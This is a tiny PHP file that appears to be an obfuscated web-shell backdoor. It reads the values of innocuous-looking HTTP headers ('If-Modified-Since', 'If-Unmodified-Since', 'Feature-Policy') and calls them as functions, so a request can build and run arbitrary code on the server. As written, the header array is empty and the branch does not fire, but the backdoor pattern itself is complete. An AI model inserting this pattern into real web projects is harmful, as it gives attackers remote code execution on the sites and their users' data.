<?php
$_HEADERS = Array();
if (isset($_HEADERS['If-Modified-Since'])) {
    $partition = $_HEADERS['If-Modified-Since']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Feature-Policy']));
    $partition();
}